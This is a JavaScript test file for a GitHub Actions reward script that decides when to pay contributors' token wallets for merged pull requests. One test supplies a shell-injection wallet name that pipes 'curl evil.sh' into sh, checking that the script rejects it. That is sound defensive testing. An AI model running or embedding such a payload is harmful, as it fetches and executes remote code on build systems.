const test = require("node:test");
const assert = require("node:assert");

const decide = require("./reward-context.cjs");

// closedByPr defaults to 42, the harness pull request.
function issue(number, label, { closedByPr = 42 } = {}) {
  return {
    number,
    labels: { nodes: [].concat(label).map((name) => ({ name })) },
    timelineItems: { nodes: [{ closer: { number: closedByPr } }] },
  };
}

function harness({
  merged = true,
  base = "main",
  authorType = "User",
  issues = [issue(7, "token:50")],
  comments = [],
  event = "pull_request",
  commenter = "hariclerry",
} = {}) {
  const outputs = {};

  const github = {
    graphql: async () => ({
      repository: {
        pullRequest: { closingIssuesReferences: { nodes: issues } },
      },
    }),
    paginate: async () => comments,
    rest: {
      pulls: {
        get: async () => ({
          data: {
            merged,
            base: { ref: base },
            user: { login: "hariclerry", type: authorType },
          },
        }),
      },
      issues: { listComments: () => {} },
    },
  };

  const context = {
    eventName: event,
    repo: { owner: "Greenstand", repo: "treetracker-wallet-app" },
    payload: {
      pull_request: { number: 42 },
      issue: { number: 42 },
      comment: { user: { login: commenter } },
    },
  };

  const core = {
    info: () => {},
    setOutput: (key, value) => {
      outputs[key] = value;
    },
  };

  return { github, context, core, outputs };
}

const claim = (login, body) => ({ user: { login }, body });

test("asks the author to claim when no wallet was given", async () => {
  const h = harness();
  await decide(h);
  assert.equal(h.outputs.action, "prompt");
  assert.equal(h.outputs.amount, 50);
});

test("pays the wallet the author named", async () => {
  const h = harness({ comments: [claim("hariclerry", "/wallet hariet")] });
  await decide(h);
  assert.equal(h.outputs.action, "pay");
  assert.equal(h.outputs.wallet, "hariet");
  assert.equal(h.outputs.issues, "[7]");
});

test("ignores a claim from anyone but the author", async () => {
  const h = harness({
    event: "issue_comment",
    commenter: "someone-else",
    comments: [claim("someone-else", "/wallet thief")],
  });
  await decide(h);
  assert.equal(h.outputs.action, "none");
});

test("pays nothing for an unmerged pull request", async () => {
  const h = harness({ merged: false });
  await decide(h);
  assert.equal(h.outputs.action, "none");
});

test("pays nothing twice for the same issue", async () => {
  const h = harness({
    issues: [issue(7, ["token:50", "token:paid"])],
    comments: [claim("hariclerry", "/wallet hariet")],
  });
  await decide(h);
  assert.equal(h.outputs.action, "none");
});

test("adds up every unpaid issue the pull request closes", async () => {
  const harnessData = harness({
    issues: [issue(7, "token:50"), issue(9, "token:25")],
    comments: [claim("hariclerry", "/wallet hariet")],
  });
  await decide(harnessData);
  assert.equal(harnessData.outputs.amount, 75);
  assert.equal(harnessData.outputs.issues, "[7,9]");
});

test("pays nothing when a bot opened the pull request", async () => {
  const harnessData = harness({ authorType: "Bot" });
  await decide(harnessData);
  assert.equal(harnessData.outputs.action, "none");
});

test("ignores a claim whose wallet name could reach a shell", async () => {
  const harnessData = harness({
    comments: [claim("hariclerry", '/wallet x";curl evil.sh|sh;"')],
  });
  await decide(harnessData);
  assert.equal(harnessData.outputs.action, "prompt");
});

test("pays nothing for a merge into another branch", async () => {
  const h = harness({
    base: "release/2.1",
    comments: [claim("hariclerry", "/wallet hariet")],
  });
  await decide(h);
  assert.equal(h.outputs.action, "none");
});

test("matches the labels already on the repo, Token:13 and Token: 21", async () => {
  const h = harness({
    issues: [issue(7, "Token:13"), issue(9, "Token: 21")],
    comments: [claim("hariclerry", "/wallet hariet")],
  });
  await decide(h);
  assert.equal(h.outputs.amount, 34);
});

test("treats Token: Paid as already paid", async () => {
  const h = harness({
    issues: [issue(7, ["Token: 21", "Token: Paid"])],
    comments: [claim("hariclerry", "/wallet hariet")],
  });
  await decide(h);
  assert.equal(h.outputs.action, "none");
});

test("pays nothing for an issue this pull request did not close", async () => {
  const h = harness({
    issues: [issue(7, "token:50", { closedByPr: 99 })],
    comments: [claim("hariclerry", "/wallet hariet")],
  });
  await decide(h);
  assert.equal(h.outputs.action, "none");
});

test("pays nothing for an issue that was never closed", async () => {
  const h = harness({
    issues: [{ number: 7, labels: { nodes: [{ name: "token:50" }] } }],
    comments: [claim("hariclerry", "/wallet hariet")],
  });
  await decide(h);
  assert.equal(h.outputs.action, "none");
});
